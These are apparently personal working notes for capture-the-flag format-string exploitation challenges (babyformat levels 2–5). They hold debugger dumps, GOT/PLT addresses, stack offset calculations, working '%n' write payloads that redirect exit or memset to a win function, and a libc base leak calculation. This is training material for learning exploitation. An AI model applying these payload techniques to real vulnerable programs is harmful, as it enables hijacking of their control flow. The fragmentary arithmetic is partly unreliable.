
========== 1 ============
40131d <win>:  = 4199197 

 # 404050 <memset@GLIBC_2.2.5>

0000000000401180 <memset@plt>:
  401180:       f3 0f 1e fa             endbr64 
  401184:       f2 ff 25 c5 2e 00 00    bnd jmpq *0x2ec5(%rip)        # 404050 <memset@GLIBC_2.2.5>
  40118b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)


401437:	e8 44 fd ff ff       	callq  401180 <memset@plt>
40143c:	8b 85 c4 fb ff ff    	mov    -0x43c(%rbp),%eax
401442:	48 98                	cltq   
401444:	ba 00 04 00 00       	mov    $0x400,%edx
401449:	48 29 c2             	sub    %rax,%rdx
40144c:	48 8b 85 c8 fb ff ff 	mov    -0x438(%rbp),%rax
401453:	be 00 00 00 00       	mov    $0x0,%esi
401458:	48 89 c7             	mov    %rax,%rdi
40145b:	e8 20 fd ff ff       	callq  401180 <memset@plt>

0x00000000004014cd <+358>:   call   0x401160 <printf@plt>
│gef➤  info r

Consider this - 
if your padding is 0x20 (32), that is 4 memory blocks
1 pointer and 2 ints would add another 8 + 4 + 4 = 2 memory blocks
payload string would occupy 16 bytes = 2 memory blocks
and printf will start to look from 6th position in stack

4 + 2 + 2 + 6 = 14$

============================== 2 =========================================
0x1d0 = 464 / 8 = 58
[*] '/challenge/babyformat_level2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
hacker@format-string-level

0000000000001190 <memset@plt>:
    1190:       f3 0f 1e fa             endbr64 
    1194:       f2 ff 25 05 2e 00 00    bnd jmpq *0x2e05(%rip)        # 3fa0 <memset@GLIBC_2.2.5>
    119b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0x3fa0 = 16288

0000000000001330 <win>:
0x1330 = 4912

gef➤  p/x $rbp+8
│$5 = 0x7ffebb150188
│gef➤  p/x $rsp
│$6 = 0x7ffebb14fb80

>>> 0x7ffebb150188
140732037136776
>>> 0x7ffebb14fb80
140732037135232
>>> (140732037136776-140732037135232)/8 = 1544/8 (rip - rsp) / 8
193.0 + 6 registers = 199

1730:       e8 45 fc ff ff          callq  137a <func>
1735:       b8 00 00 00 00          mov    $0x0,%eax

│gef➤  info r
│rax            0x0                 0x0
│rbx            0x2020202020202020  0x2020202020202020
│rcx            0x7fcc3126d077      0x7fcc3126d077
│rdx            0x0                 0x0
│rsi            0x7fcc3134c723      0x7fcc3134c723
│rdi            0x7ffcbbfe84d0      0x7ffcbbfe84d0
│rbp            0x7ffcbbfe88f0      0x7ffcbbfe88f0
│rsp            0x7ffcbbfe82f0      0x7ffcbbfe82f0
│r8             0x18                0x18
│r9             0x2d                0x2d
│r10            0x56449162a4bb      0x56449162a4bb
│r11            0x246               0x246
│r12            0x564491629200      0x564491629200
│r13            0x7ffcbbfe8a30      0x7ffcbbfe8a30
│r14            0x0                 0x0
│r15            0x0                 0x0
│rip            0x5644916295b2      0x5644916295b2 <func+568>
│eflags         0x202               [ IF ]
│cs             0x33                0x33
│ss             0x2b                0x2b
│ds             0x0                 0x0
│es             0x0                 0x0
│fs             0x0                 0x0
│gs             0x0                 0x0

gef➤  x/i $pc
=> 0x563deb97b5b2 <func+568>:   call   0x563deb97b170 <printf@plt>
gef➤  
│gs     

1730:       e8 45 fc ff ff          callq  137a <func>
1735:       b8 00 00 00 00          mov    $0x0,%eax

gef➤  x/i $pc
=> 0x5636b534d5b2 <func+568>:	call   0x5636b534d170 <printf@plt>
gef➤  x/s $rdi
0x7ffe4b97d7d0:	"Your input is:", ' ' <repeats 107 times>, "\n", 'A' <repeats 14 times>, "\n"
gef➤  

gef➤  p/x $rsp
$1 = 0x7ffe4b97d5f0

0xd7d0 + 14 + 107 + 1 - 0xd5f0 = 602 / 8 = 75 || 602%8 = 2
75 + 6 = 81 , 2 padding
win addr value - 122 = 


gef➤  p/x $rbp
$1 = 0x7ffde110b2e0   // main rbp

gef➤  p/x $rbp
$1 = 0x7ffc96359fd0 // func rbp
0x7ffde110b2e0 - 0x7ffc96359fd0 = 5550838544

--------
0x7ffe8120c6c0 (rsp) - 0x7ffe8120ccc0 (rbp) = -1536/8 = 192 = offset
%193$p // rip func , place where return in main // need to change it somehow
0x7ffd42121420 = rbp main
0x7ffd421213d0 = rbp func
rbp main - rbp func = 80

gef➤  x/s $rdi
0x7ffd42120fb0:	"Your input is:", ' ' <repeats 107 times>, "\nAAAAAA\n" = 122/8 = 15, 2 padding
0x7ffd42120fb0 (rdi) - 0x7ffd42120dd0(rsp) = 480/8 = 60
60 + 122/8 (input) + 6 = 60 + 15 + 6 = 81, 2 remiander
win_addr_val = rip_func - 0x1735 + 0x1330
0xe330 - 122 = 58038
============ ch 4=========
0000000000401150 <memset@plt>:
  401150:       f3 0f 1e fa             endbr64 
  401154:       f2 ff 25 ed 2e 00 00    bnd jmpq *0x2eed(%rip)        # 404048 <memset@GLIBC_2.2.5>
  40115b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

00000000004012dd <win>:  = 4199133
func - 0x00000000004014b8 <+401>:	call   0x401130 <printf@plt>

gef➤  x/s $rdi
0x7ffe2af6cc70:	"Your input is:", ' ' <repeats 68 times>, "\n", 'A' <repeats 11 times>, "\n"


│gef➤  x/s $rdi
│0x7ffc8fb72b00: "Your input is:", ' ' <repeats 68 times>, "\n%4199133X%149$lnH@@"
│gef➤  info r
│rax            0x0                 0x0
│rbx            0x2020202020202020  0x2020202020202020
│rcx            0x7f93cdfe3077      0x7f93cdfe3077
│rdx            0x0                 0x0
│rsi            0x7f93ce0c2723      0x7f93ce0c2723
│rdi            0x7ffc8fb72b00      0x7ffc8fb72b00
│rbp            0x7ffc8fb72f20      0x7ffc8fb72f20
│rsp            0x7ffc8fb72920      0x7ffc8fb72920
│r8             0x14                0x14
│r9             0x2d                0x2d
│r10            0x4005cf            0x4005cf
│r11            0x246               0x246
│r12            0x4011b0            0x4011b0
│r13            0x7ffc8fb73060      0x7ffc8fb73060
│r14            0x0                 0x0
│r15            0x0                 0x0
│rip            0x4014b8            0x4014b8 <func+401>
│eflags         0x206               [ PF IF ]
│cs             0x33                0x33
│ss             0x2b                0x2b
│ds             0x0                 0x0
│es             0x0                 0x0
│fs             0x0                 0x0
│gs             0x0                 0x0
│gef➤  x/20gx $rsp
│0x7ffc8fb72920: 0x00000053ce0c7000      0x00007ffc8fb72b53
│0x7ffc8fb72930: 0x0000000000400478      0x00007f93ce0c7570
│0x7ffc8fb72940: 0x00007f93cded7960      0x00007f93ce0dd88a
│0x7ffc8fb72950: 0x000000000000037f      0x00007f93cdee6ea0
│0x7ffc8fb72960: 0x00007f93ce0c7000      0x00007ffc8fb72a08
│0x7ffc8fb72970: 0x00007ffc8fb72a04      0x0000000000000000
│0x7ffc8fb72980: 0x00007f93cdee6ea0      0x0000000000000000
│0x7ffc8fb72990: 0x0000000000000000      0x00007f93cded9070
│0x7ffc8fb729a0: 0x00000000004005c8      0x000000000d82b830
│0x7ffc8fb729b0: 0x0000000000360ae0      0x00007ffc8fb72a04
│gef➤  x/s 0x7ffc8fb72920
│0x7ffc8fb72920: ""
│gef➤  x/s 0x00000053ce0c7000
│0x53ce0c7000:   <error: Cannot access memory at address 0x53ce0c7000>
│gef➤  x/s 0x0000000000360ae0

00000000004011a0 <exit@plt>:
  4011a0:       f3 0f 1e fa             endbr64 
  4011a4:       f2 ff 25 c5 2e 00 00    bnd jmpq *0x2ec5(%rip)        # 404070 <exit@GLIBC_2.2.5>
  4011ab:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

563%8=3, 563/8 = 70
4199133 - 14-68-1=4199050

rdi + 14 + 68 + 1 - rsp
padding = 0x7ffc8fb72b00 (rdi) - 0x7ffc8fb72920 (rsi) + 14 + 68 + 1 [leading input] = 563
4199133 (win addr in decimal) - 563 (padding) = 4198570
68$ (positional argument location calculation) = 58 (struct  layout padding ) + 2 (pointer and int) + 2 (payload string) + 6 (stack location)
buf = b"%04198570d%68$ln" + p64(0x404070) // term1 + p64(exit location), writing win into exit func

 exploit = b"%4199133X%151$ln" + p64(0x404048)  // 4199133 = win address ,  0x404048 = memset memory location, 151$ = 58 (struct  layout padding ) + 14+68+1 (for leading input) + 2 (pointer and int) + 2 (payload string) + 6 (stack location)

 gef➤  x/s $rdi
 │0x7ffed767e510: "Your input is:", ' ' <repeats 68 times>, "\n%04198570d%68$lnp@@"
 │gef➤  p/x $rsp
 │$1 = 0x7ffed767e330

 │0x7ffed767e510 - 0x7ffed767e330 + 14 + 68 + 1 = 563


 563, 83  


 win = 4199133

1)4199133 - 563 = 4198570
2)4199133 - 83 = 4199050

58 + 6 + 4 = 68

563/8 = 71, 70
83/8 = 11, 10

68, 138, 139, 78, 79

buf = b"%04198570d%68$ln" + p64(0x404070)

buf = b"%04199050d%76$ln" + p64(0x404070)


0x7ffed767e510 - 0x7ffed767e330 = 480/8 = 60
60 + 14 + 68 + 1 = 143 + 6 = 149
563/8 = 70 + 6 = 76

=============================== 3 ========
b *func+525
b *main+341
0x7fffd19b8310 (main rbp) - func rbp (0x7fffd19b82c0) = 80
0x7fffd19b7ea0: "Your input is:", ' ' <repeats 67 times>, "\n%198$p\n" = 14+67+1=82/8=10, 82%2=2
0x7fffd19b7ea0 rdi - 0x7fffd19b7d30 rsp= 368

0x7fffd19b82c0 rbp - 0x7fffd19b7d30 rsp= 1424/8 = 178+6 = 184

0x7ffd0dc18430 = rbp , 0x5653f93886ba

0x7ffeb9d8d188 rbp+8 - 0x7ffeb9d8cbf0  rsp = 1432/8 = 179+6=185

rbp            0x7ffecc553ba0

0000000000001330 <win>:
    1705:       e8 70 fc ff ff          callq  137a <func>
    170a:       b8 00 00 00 00          mov    $0x0,%eax

>>> 0xe330 - 82
58078    

0x7fff3a1c1640 - 0x7fff3a1c14d0 = 368/8=46 (rdi-rsp)/8=368/8=46
46+6+10(82/8)=62 + 2 remiander 
payload=b"%058078d%64$hn"+p64(rip_func)

================= 5 =====================
 b *func+66
 b *func+344
<+341>:   call   0x40129d <func>
<+344>:   call   0x401110 <printf@plt>
0x7ffe03718390 - 0x7ffe03717f10 = rbp -rsp = 1152/8=144 = rbp func - rsp func
0x7ffe49d3f530 - 0x7ffe49d3f4e0 = 80 (rbp main - rbp func)
0x7fffad1fd4c0: "Your input is:", ' ' <repeats 26 times>, "\n%150$p\n%150$p\n"  // gef➤  x/s $rdi  = 14+26+1(new line char)=41

0000000000401160 <exit@plt>:
  401160:       f3 0f 1e fa             endbr64 
  401164:       f2 ff 25 f5 2e 00 00    bnd jmpq *0x2ef5(%rip)        # 404060 <exit@GLIBC_2.2.5>
  40116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

rdi - rsp = 0x7ffdaa7d4b90 - 0x7ffdaa7d4b30 = 96/8 = 12

41 
12 + 6 (for stack args) + 41 / 8 (input string) = 18 + 5 = 23 and 1 remiander = 24 is positional argument

10 + 2 + 2 (payload string) + 6 = 20$ # not consideration
000000000040129d <func>: = 4199069
char padding[0x50] = 80 / 8 = 10
4199069 - 41 = 4199028
payload = "%04199028d%20$ln" + p64(0x404060) #exit got -> func

f = FmtStr(send_fmt_payload, offset=24, padlen=7, numbwritten=41)

0x7ffd6a2afbb0 - 0x7ffd6a2af730 = rbp - rsp = 1152/8 = 144

0x7fffcdf4db80 - 0x7fffcdf4db30 = rbp main - func = 80

0x00007f37af6b6000 0x00007f37af6d8000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ff5462e3000

00000000004010e0 <puts@plt>:
  4010e0:	f3 0f 1e fa          	endbr64 
  4010e4:	f2 ff 25 35 2f 00 00 	bnd jmpq *0x2f35(%rip)        # 404020 <puts@GLIBC_2.2.5>
  4010eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

  0x00000000004015d3 : pop rdi ; ret  // ROPgadget --binary ./babyformat_level5 --only "pop|ret"

  hacker@format-string-level-5:/challenge$ objdump -T /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep puts
0000000000084420 g    DF .text	00000000000001dc  GLIBC_2.2.5 _IO_puts
0000000000084420  w   DF .text	00000000000001dc  GLIBC_2.2.5 puts     #considered
0000000000124330 g    DF .text	00000000000004f4  GLIBC_2.2.5 putspent
0000000000126000 g    DF .text	00000000000002d8  GLIBC_2.10  putsgent
0000000000082ce0  w   DF .text	0000000000000180  GLIBC_2.2.5 fputs
0000000000082ce0 g    DF .text	0000000000000180  GLIBC_2.2.5 _IO_fputs
000000000008e320  w   DF .text	000000000000009f  GLIBC_2.2.5 fputs_unlocked

readelf -s /lib/x86_64-linux-gnu/libc.so.6  // symbol table of libc.so.6

The output of the readelf -s command on the libc.so.6 file typically includes a list of symbols defined in the library, as well as their addresses, sizes, and other information. Some of the commonly used symbols in the libc library include:

printf, scanf, and other functions from the standard C library
system, execve, and other system calls
__libc_start_main, which is the entry point of most C programs on Linux
exit, exit_group, and other functions for terminating a process
malloc, calloc, realloc, and other memory management functions

hacker@format-string-level-5:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
  2238: 0000000000023f90   483 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.2.5

base = int(leak[:-1],16) - 0x23f90 - 0xF3


working payload = payload = b"%04199028d%26$lnAAAAAAA" + p64(0x404060) 

0x7ffe9d5390e0(prev func rbp)-0x7ffe9d538c50(new func rbp)=1168
0x7ffeb07645d0 - 0x7ffeb0764150 = 1152 (rbp func - rsp func)

rbp            0x7ffc0af656a0
rsp            0x7ffc0af65220  0x7ffc0af65220

rbp            0x7ffc0af65210
rsp            0x7ffc0af64d90

(rdi-rsp)/8 + 6 + (leadin string length+padding to align)/8
The numbwritten = the leading bytes of the text already written + any padding you add


======================== 6 =========================================

================================ 7 =================================